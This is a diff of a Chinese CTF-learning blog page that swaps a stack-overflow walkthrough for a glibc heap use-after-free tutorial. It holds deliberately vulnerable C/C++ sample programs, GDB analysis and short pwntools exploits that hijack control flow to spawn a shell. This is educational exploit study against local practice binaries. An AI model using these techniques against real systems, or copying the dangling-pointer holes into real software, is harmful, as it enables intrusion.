@@ -4,11 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="linux-栈溢出-无保护, 时钟">
-    <meta name="description" content="首先我们先介绍一下栈溢出的基本原理：
-    栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。
+    <meta name="keywords" content="glibc heap UAF, 时钟">
+    <meta name="description" content="use after free（UAF）
 
-PS：这一次比赛中遇到的简单题目，也是我做">
+重新malloc一样的大小，会拿到曾经Free的chunk，此时就会有两个指针p，和q指向同一个内存块，使用这两个的指针操作混在一起（之前的哪个指针在chun被free后没有被置为NULL，形成悬空">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +15,7 @@ PS：这一次比赛中遇到的简单题目，也是我做">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>linux-栈溢出-无保护 | 时钟</title>
+    <title>glibc heap UAF | 时钟</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -242,13 +241,13 @@ PS：这一次比赛中遇到的简单题目，也是我做">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        linux-栈溢出-无保护
+                        glibc heap UAF
                     </div>
                 </div>
             </div>
@@ -359,8 +358,8 @@ PS：这一次比赛中遇到的简单题目，也是我做">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn入门/" target="_blank">
-                                <span class="chip bg-color">pwn入门</span>
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
                     </div>
@@ -371,8 +370,8 @@ PS：这一次比赛中遇到的简单题目，也是我做">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/PWM/" class="post-category" target="_blank">
-                                PWM
+                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
+                                漏洞利用
                             </a>
                         
                     </div>
@@ -383,21 +382,21 @@ PS：这一次比赛中遇到的简单题目，也是我做">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-04-06
+                    2019-08-02
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        405
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        4 分
                     </div>
                     
                 
@@ -413,16 +412,86 @@ PS：这一次比赛中遇到的简单题目，也是我做">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <pre><code>首先我们先介绍一下栈溢出的基本原理：
-    栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。
-
-PS：这一次比赛中遇到的简单题目，也是我做出来的第一个pwn
-废话不多说，拿到一个名为h2的题目，用ida打开（我们通过F5可以看到题目的伪代码）
-int __cdecl main(int argc, const char **argv, const char **envp)
-</code></pre><p>{<br>  char s; // [rsp+0h] [rbp-80h]</p>
-<p>  puts(“Hello world!”);<br>  puts(“WHO ARE YOU:”);<br>  gets(&amp;s, argv);<br>  printf(“HELLO “);<br>  puts(&amp;s);<br>  return 0;<br>}<br>  （此为F5中的伪代码，非常简单）<br>    get函数是一个危险函数，当终端的输入量过大的时候，就会造成栈溢出，同时我们在ida左侧的Functions window下面看到了system函数，<br>    有基础的人看到这里，一定觉得题目也过于简单了吧，竟然留后门，但是这个题目可以帮助小白们很好的理解栈溢出原理和它的可怕之处。<br>    system():<br>    _system    .plt    00000000004004B0    00000006            R    .    .    .    .    T    .<br>    有了system的地址，我们只需要让程序执行它就可以了，在linux系统中运行h2，gdb测量一下就知道栈空间大小为136，<br>    那么我们就写exp了吧：<br>    {<br>        from pwn import <em><br>        sh = process(“h2”)<br>        sh.sendline(“a”</em>136+p64(0x4005f6))<br>        sh.interactive()<br>    }（就是这简单，四行代码getshell）</p>
-<p>说明： 如果想要试试的话可以到我的github上下载题目 <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shizhongpwn/pwnstudy.git</p>
-
+                <p>use after free（UAF）</p>
+<ul>
+<li>重新malloc一样的大小，会拿到曾经Free的chunk，此时就会有两个指针p，和q指向同一个内存块，使用这两个的指针操作混在一起（之前的哪个指针在chun被free后没有被置为NULL，形成悬空指针）</li>
+<li>还有一个小点就是要注意在64bits的时候有可能会出现高位的\x00截断这种事情</li>
+<li>这个关键的一点就是free掉的内存块，还是可以再次拿出来用的，就想之前free的chunk，malloc的也可以再次拿出来，我们看一个例子</li>
+</ul>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;cstdlib&gt;
+#include&lt;cstring&gt;
+class A{
+    public:
+        virtual void print()
+        {
+            puts(&quot;class A&quot;);
+        }
+};
+class B:public A{
+    public:
+        void print(){
+            puts(&quot;class B&quot;);
+        }
+};
+void sh(){
+    system(&quot;sh&quot;);
+}
+char buf[1024];
+int main()
+{
+    setvbuf(stdout,0,_IONBF,0);   \\这个setvbuf是C库函数，作用跟参数有关，可以百度一下，目前的作用是
+    A *p = new B();
+    delete p;
+    fgets(buf,sizeof(buf),stdin);
+    char *q = strdup(buf);   \\这个其实就是有一个malloc分配内存块然后把字符串打印进去
+    p-&gt;print();
+}
+</code></pre><p>然后就要分析一下这个源码，首先看一下strdup的源码，这个函数定义在string.h这个头文件之中，</p>
+<pre><code>char * __strdup(const char *s)
+{
+   size_t  len = strlen(s) +1;
+   void *new = malloc(len);
+   if (new == NULL)
+      return NULL;
+   return (char *)memecpy(new,s,len);
+}
+</code></pre><p>那么我们开始走程序，我们在delete p下断点执行程序，然后看ida先分析一下，<br><img src="/2019/08/02/glibc-heap-uaf/1.png" title="This is an image"><br>我们可以看到申请了是8bit的内存空间，但是对齐到最后应该会生成一个32位大小的堆块，进GDB<br><img src="/2019/08/02/glibc-heap-uaf/2.png" title="This is an image"><br>我们看到分配的mem在rax里面，而且目前mem刚申请出来，还都是0，其实也可以看到，下面有一个清0的操作，下面来个图带解释<br><img src="/2019/08/02/glibc-heap-uaf/3.png" title="This is an image"><br>call B之后内存块是这样的<br><img src="/2019/08/02/glibc-heap-uaf/4.png" title="This is an image"><br>然后紧接着的delete就给全清0了<br><img src="/2019/08/02/glibc-heap-uaf/5.png" title="This is an image"><br>然后紧接着fgets 输入8个a ，输入到了0x601160这个bss段，然后就指向strdup函数，然后把bss段的东西读入到新申请的mem<br><img src="/2019/08/02/glibc-heap-uaf/6.png" title="This is an image"><br>这时候我们惊喜的发现我们之前的chunk被拿出来用了，被填上了我们的输入，那么因为之前那个指针p没有被置为NULL,所以它还是指向这里的，我们可以利用此来劫持函数流，因为源代码的下面,还可以看看ida里面，有一个p的调用：<br><img src="/2019/08/02/glibc-heap-uaf/7.png" title="This is an image"><br>接下来利用过程就很关键了：<br><img src="/2019/08/02/glibc-heap-uaf/8.png" title="This is an image"><br>我们就可以开做题了：</p>
+<pre><code>#coding:utf-8
+from pwn import *
+r = process(&#39;./use-after-free&#39;)
+buf = 0x601160
+system_sh = 0x000000000400906
+r.sendline(p64(buf+8)+p64(system_sh))     #这个送过去的数据不能太大，太大的话就不会申请的原来的chunk,如果想要刚刚好的话是24byte,不过这个不用刚刚好，因为chunk补齐，chunk的最小刚好是32byte,+8是因为对输入的地址要进行解引用的，可以看细看解析的最后一部分
+r.interactive()
+</code></pre><p>下面这个是个32位的例子，来自安全客，看题目源码：</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+typedef void (*func_ptr)(char *);   //定义了一个函数指针，参数类型char *,没有返回值
+void evil_fuc(char command[])
+{
+    system(command);
+}
+void echo(char content[])
+{
+    printf(&quot;%s&quot;,content);
+}
+int main()
+{
+    func_ptr *p1=(int*)malloc(4*sizeof(int));
+    printf(&quot;malloc addr: %pn&quot;,p1);
+    p1[3]=echo;   //这个代表的是分配出来的内存块的第四个
+    p1[3](&quot;hello worldn&quot;);
+    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针
+    p1[3](&quot;hello againn&quot;); //p1指针未被置空,虽然free了,但仍可使用.
+    func_ptr *p2=(int*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.
+    printf(&quot;malloc addr: %pn&quot;,p2);
+    printf(&quot;malloc addr: %pn&quot;,p1);//p2与p1指针指向的内存为同一地址
+    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.
+    p1[3](&quot;whoami&quot;);   //p1这个指针跟先前的操作一样，本来是要传个参数给echo，但是因为被p2改成evil_fuc,参数就给了evil,当然这里换成p2也可以的
+    return 0;
+}
+</code></pre>
             </div>
             <hr>
 
@@ -453,9 +522,9 @@ int __cdecl main(int argc, const char **argv, const char **envp)
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《linux-栈溢出-无保护》
+                    《glibc heap UAF》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/04/06/linux-zhan-yi-chu-wu-bao-hu/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/02/glibc-heap-uaf/" property="cc:attributionName" rel="cc:attributionURL">
                 时钟
             </a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
@@ -498,44 +567,32 @@ int __cdecl main(int argc, const char **argv, const char **envp)
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/04/13/tong-guo-esp-kuo-da-zhan-kong-jian/">
+                <a href="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="通过esp扩大栈空间">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="逆向工程小知识">
                         
-                        <span class="card-title">通过esp扩大栈空间</span>
+                        <span class="card-title">逆向工程小知识</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。博主QQ：522796871遇到一个修改esp扩大栈空间的题目跟大家分享一下：程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序
+                            
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-13
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-02
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/PWM/" class="post-category" target="_blank">
-                                    PWM
-                                </a>
-                            
+                            <i class="fa fa-user fa-fw"></i>
+                            时钟
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/pwn入门/" target="_blank">
-                        <span class="chip bg-color">pwn入门</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -544,49 +601,49 @@ int __cdecl main(int argc, const char **argv, const char **envp)
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/04/06/linux-zhan-yi-chu-wu-bao-hu/">
+                <a href="/2019/08/02/glibc-heap-unlink-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="linux-栈溢出-无保护">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="glibc heap unlink漏洞">
                         
-                        <span class="card-title">linux-栈溢出-无保护</span>
+                        <span class="card-title">glibc heap unlink漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            首先我们先介绍一下栈溢出的基本原理：
-    栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。
+                            知识点：
 
-PS：这一次比赛中遇到的简单题目，也是我做
+free操作会检查前后相邻堆块是否in_use，空闲的话就会进行合并操作
+空闲的堆块一般以双向链表的形式存在（fastbin是单向链表不适用此种攻击）
+unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-06
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-02
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/PWM/" class="post-category" target="_blank">
-                                    PWM
+                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
+                                    漏洞利用
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn入门/" target="_blank">
-                        <span class="chip bg-color">pwn入门</span>
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
@@ -744,7 +801,7 @@ PS：这一次比赛中遇到的简单题目，也是我做
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">2.4k</span>
+                <span class="white-color">3.8k</span>
             
 
             
